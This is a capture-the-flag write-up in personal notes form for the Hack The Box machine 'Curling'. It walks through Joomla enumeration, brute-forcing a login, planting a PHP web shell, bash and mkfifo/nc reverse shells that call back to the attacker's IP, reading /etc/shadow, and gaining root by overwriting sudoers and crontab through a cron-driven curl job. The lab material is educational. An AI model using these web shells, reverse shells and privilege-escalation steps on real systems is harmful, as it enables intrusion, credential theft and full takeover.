# 📦 HTB | curling

Tags: #📦
Related to: 
See also: [[PHP]], [[base64]], [[bash]], [[burpsuite]], [[bzcat]], [[bzip2]], [[cewl]], [[cron]] ,[[crontab]], [[curl]], [[cyberchef]], [[dev shm]], [[file]], [[gzip]], [[joomscan]], [[nc]], [[nmap]], [[powershell]], [[pspy]], [[python]], [[rlwrap]], [[stty]], [[tar]], [[tee]], [[watch]], [[wfuzz]], [[wget]], [[xxd]], [[zcat]]
Previous: [[01 HTB/HTB]]

- [x] official walkthrough
- [x] ippsec

## Enumeration

### nmap default script and version scan

	nmap -sC -sV -oA nmap/curling 10.129.171.59
	
```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 13:57 EDT
Nmap scan report for 10.129.171.59
Host is up (0.072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
```

### View website

	firefox 10.129.171.59	// Website title is "CewlCurlingSite!"

### Crawl website with cewl and generate custom wordlist

	cewl -w cewl.out 10.129.171.59

### Review website source code

Joomla! CMS detected by nmap:
`<meta name="generator" content="Joomla! - Open Source Content Management" />`

Default template:
`<link href="/templates/protostar/css/template.css?4c6b364068a1c45e7cd3bb9b6a49b052"`

Username: Super User
```html
<dd class="createdby" itemprop="author" itemscope itemtype="https://schema.org/Person">
					Written by <span itemprop="name">Super User</span>	</dd>
```

Username: Floris
```html
<p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>
<p>- Floris</p>
```

Filename: secret.txt
```html
</body>
      <!-- secret.txt -->
</html>
```

secret.txt
`Q3VybGluZzIwMTgh`

### Rule: base64 decode all files if they contain alphanumeric things

```bash
base64 -d secret.txt
Curling2018!
```

	echo 'Curling2018!' > joomla-pw.txt

#### A hint that a file is base64 encoded is if it's divisible by 4

	Q3Vy bGlu ZzIw MTgh

#### A single character base64 encoded is padded to make it divisible by 4

	echo -n 1 | base64

`MQ==`

- Note: It may not have padding it were a url version of base64. base64 doesn't always have padding.

### Reconnaissance with joomscan

#### No man page; check help

	joomscan -h

```text
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

   

Help :

Usage:  joomscan [options]

--url | -u <URL>                |   The Joomla URL/domain to scan.
--enumerate-components | -ec    |   Try to enumerate components.

--cookie <String>               |   Set cookie.
--user-agent | -a <User-Agent>  |   Use the specified User-Agent.
--random-agent | -r             |   Use a random User-Agent.
--timeout <Time-Out>            |   Set timeout.
--proxy=PROXY                   |   Use a proxy to connect to the target URL
           Proxy example: --proxy http://127.0.0.1:8080
                                  https://127.0.0.1:443
                                  socks://127.0.0.1:414
                                  
--about                         |   About Author
--help | -h                     |   This help screen.
--version                       |   Output the current version and exit.
```

	joomscan --url

### Run scan, piped to tee because there's no output file option

	joomscan -ec -url 10.129.171.59 | tee joomscan.out

```text
[+] Detecting Joomla Version
[++] Joomla 3.8.8

[+] admin finder
[++] Admin page : http://10.129.171.59/administrator/

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.129.171.59/administrator/components
http://10.129.171.59/administrator/modules
http://10.129.171.59/administrator/templates
http://10.129.171.59/images/banners
```

### Verify Joomla! version by manual enumeration

	10.129.171.59/administrator/manifests/files/joomla.xml

```html
<copyright>
(C) 2005 - 2018 Open Source Matters. All rights reserved
</copyright>

<version>3.8.8</version>
```


	https://www.google.com/search?q=joomla+changelog+3.8.8

At the time this Walkthrough was published there were no Joomla! 3.8.8 core exploits public. However, the following query today yields public exploits.
- https://www.youtube.com/watch?v=Lqehvpe_djs&list=PLidcsTyj9JXJrgTzRYdwnUhUThb9bL9py&index=8
https://www.google.com/search?q=joomla+core+vulnerabilities [^1] [^2]

### Intercept traffic using burpsuite

1. Enable Proxy => Intercept is on
2. Use Burp's embedded browser.
3. Browse to 10.129.171.59/administrator
4. Forward until login page is loaded.
5. Set username to FUZZ
6. Set password to Curling2018!
7. Click Login
8. Copy cookie and post data:

		99fb082d992a92668ce87e5540bd20fa=omf6d7fp9a02939ooeqahd5dnl
		
		username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&d36732e30d0405ece8d5e1e1e343928b=1

###  Bruteforce username using wfuzz and a custom wordlist

	wfuzz -h

#### Replaces anywhere FUZZ is in all caps with a line from wordlist

##### Not proxied through burp

	wfuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' http://10.129.171.59/administrator/index.php

```bash
-w cewl.out										// wordlist
-c												// color output  
-d 												// post data  
-b												// cookie  
-p												// proxy (burp)  
http://10.129.161.239/administrator/index.php	// target

You can exclude results with one of the following:  

--hl 114										// hide results using 114 lines.  
--hc 200										// hide results using 200 response code.

After getting a correct login, you get an authentication cookie which may then cause the remaining items in the wordlist to return success responses.
```

##### Proxied through burp

Note: If you're going to proxy wfuzz through burp, make sure the ip and port match the options!

Proxy => Options => Proxy Listeners => 127.0.0.1:8080

	wfuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' -p 127.0.0.1:8080 http://10.129.171.59/administrator/index.php

`000000187:   303        0 L      0 W        0 Ch        "Floris"`

### Login with credentials

```
http://10.129.171.59/administrator/index.php
Floris
Curling2018!
```

## Foothold

### Edit CMS template PHP to get RCE

1. Extensions => Templates => Templates => Protostar Details and Files
2. Edit /index.php

#### Create a superglobal variable which accepts arbitrary input

- PHP system() is just like the C version of the function in that it executes the given command and outputs the result.

- PHP $_REQUEST is a super global variable which is used to collect data after submitting an HTML form.

#### Add to existing PHP file

	system($_REQUEST['pwn']);

#### Add to empty PHP file

	<?php system($_REQUEST['pwn']); ?>
	
### RCE

	http://10.129.171.59/templates/protostar/htb.php?pwn=id		// uid=33(www-data) gid=33(www-data) groups=33(www-data) 

### Create  reverse shell script

Spawn an interactive bash shell, redirecting standard output to a tcp socket and standard input to standard output. [^3]

	bash -i >& /dev/tcp/10.10.17.201/9001 0>&1

Try this if it doesn't work:

	bash -c 'bash -i >& /dev/tcp/10.10.17.201/9001 0>&1'
	
### Create HTTP server to serve reverse shell script

	python -m SimpleHTTPServer 80		// Python
	python3	-m http.server 80			// Python 3

### Setup listener to receive reverse shell

	nc -lvnp 9001

### Execute reverse shell script

	http://10.129.171.59/templates/protostar/htb.php?pwn=curl 10.10.17.201/reverse_shell.sh | bash

		nc -lvnp 9001
	
```text
listening on [any] 9001 ...
connect to [10.10.17.201] from (UNKNOWN) [10.129.171.59] 37656
bash: cannot set terminal process group (1542): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/protostar$
```

## Lateral Movement

### Upgrade terminal for improved functionality (arrow keys, etc.)

`www-data@curling:/var/www/html/templates/protostar$ ^[[D^[[A^[[C^[[D^[[A^[[C`

	which python
	which python3
	
#### Spawn a bash terminal

	python3 -c 'import pty;pty.spawn("/bin/bash")'

#### Background it
	<Ctrl+Z>

#### Change terminal line settings

`stty raw -echo;fg`
	
```bash
raw		// same as -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr -icrnl -ixon -ixoff -icanon -opost -isig -iuclc -ixany -imaxbel -xcase min 1 time 0
-echo	// echo input characters
;fg		// plays nice with zsh
```

#### Enable clear screen functionality

	export TERM=xterm

### Reconnaissance of /home/floris

```bash
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area/
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup	// other group read permission
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
```

	cat password_backup 
	
```bash
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

### Work with hexdump in fast shared memory

Note: ippsec uses /dev/shm in his walkthrough. You might not want to do this in real life. [^4]

	cp password_backup /dev/shm
	cd /dev/shm

	xxd -r password_backup > 1
	
```bash
BZh91AY&SY���H���A��P)ava�:4N���nT#�@%�` ▒
                                          ��z�@�i�4hdi���9�h�Q�dh▒���4i�5n▒�׌��Jh��*��}y.�<~�x�>�sVT�zH�ߢ�1�V�3�`F���"��n�
     ۇ7j:X�dR��k�� ���)p�7;����9��P▒C�Y�P       �HB��*  ��G� �U@r�rE8P����H
```
	
	file 1
	bzcat 1 > 2
	
`l[password�r�BZh91AY&SY6Ǎ����@@!PtD�� t"d�hhOPIS@��6��8ET>P@�#I bՃ|3��x���������(*N�&�H��k1��x��"�{��ೱ��]��B@�6�m��`
	
```bash
file 2
zcat 2 > 3
```

`BZh91AY&SY6Ǎ����@@!PtD�� t"d�hhOPIS@��6��8ET>P@�#I bՃ|3��x���������(*N�&�H��k1��x��"�{��ೱ��]��B@�6`

	file 3
	bzcat 3 > 4


`password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d<wdCbdZu)|hChXll`

	file 4
	tar -xf 4
	cat password.txt
	
`5d<wdCbdZu)|hChXll`

## Privilege Escalation

### SSH into floris account

```
ssh floris@10.129.171.174
5d<wdCbdZu)|hChXll
```

	cat user.txt
	65dd1df0713b40d88ead98cf11b8530b

### Explore file permission / cron vulnerability

There are various ways to observe the file permission vulnerability's relationship to cron:

#### Method 1 - time stamps

	ls -la
	
```bash
total 28
drwxr-x--- 2 root   floris  4096 May 22  2018 ./
drwxr-xr-x 6 floris floris  4096 May 22  2018 ../
-rw-rw---- 1 root   floris    25 Jul 10 10:16 input		// input & report are same date/time as local PC.
-rw-rw---- 1 root   floris 14236 Jul 10 10:16 report
```

`cat input .txt`	

	url = "http://127.0.0.1"

Gets HTML root source of page:

	cat report

Test with connection to our HTTP server:

	echo 'url = "10.10.17.201"' > input

#### Method 2 - syslog

	less /var/log/syslog

#### Method 3 - pspy

Download statically compiled binary locally:

	wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

Check that the file is an executable:

	file pspy64s

Start Simple HTTP Server:

	python -m SimpleHTTPServer 80		// Python
	python3	-m http.server 80			// Python 3

Download to target system:

	curl 10.10.17.201/pspy64s -o pspy64s

Spy on processes:

```
./pspy64s -fc	// -f 	print file system events
				// -c	color
```

### Use curl to retrieve files from arbitrary locations

	curl file:///etc/passwd

```
lightdm:x:132:140:Light Display Manager:/var/lib/lightdm:/bin/false
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

	echo 'url = "file:///root/root.txt"' > input 
	watch -n 1 cat report

`82c198ab6fc5365fdc6da2ee5c26064a`

```bash
echo 'url = "file:///etc/shadow"' > input 
watch -n 1 cat report
```

	root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1:17673:0:99999
	:7:::
	floris:$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ/AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9./Jin4e/4LURPgEBav4iv//:176
	73:0:99999:7:::

### Get root

	man curl
	
```
-K, --config <file>
Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line.
```

```
# --- Example file ---
		# this is a comment
		url = "example.com"
		output = "curlhere.html"
		user-agent = "superagent/1.0"
```

#### Get root using sudoers

Prepare sudoers host:

```bash
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
floris  ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
```

Modify input:

```bash
url = "10.10.17.201/sudoers"
output = "/etc/sudoers"
user-agent = "superagent/1.0"
```

Serve sudoers:

	sudo python -m SimpleHTTPServer 80

```bash
Serving HTTP on 0.0.0.0 port 80 ...
10.129.79.91 - - [10/Jul/2021 16:23:01] "GET /sudoers HTTP/1.1" 200 -
 3
```

	sudo su -
	root@curling:~#

#### Get root using crontabs

	echo 'url = "file:///var/spool/cron/crontabs/root"' > input 
	watch -n 1 cat report

```bash
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.1F3WTb/crontab installed on Tue May 22 19:02:51 2018)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
* * * * * curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
* * * * * sleep 1; cat /root/default.txt > /home/floris/admin-area/input
```

##### Create a malicious crontab

```bash
cp /etc/crontab .
echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.201 1234 >/tmp/f' >> crontab
```

##### Serve malicious crontab

```bash
python	-m SimpleHTTPServer 80	// Python
python3	-m http.server 80		// Python3
```

input:

```bash
url = "http://10.10.17.201/crontab"
output = "/etc/crontab"
```

##### Listen for connection

	rlwrap nc -lvnp 1234

# References

<iframe width="560" height="315" src="https://www.youtube.com/embed/Paajc2Dupms" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

[^1]: https://www.exploit-db.com/exploits/46200
[^2]: https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html

[^3]: https://explainshell.com/explain?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F8080+0%3E%261

[^4]: https://stackoverflow.com/questions/42884087/how-and-when-to-use-dev-shm-for-efficiency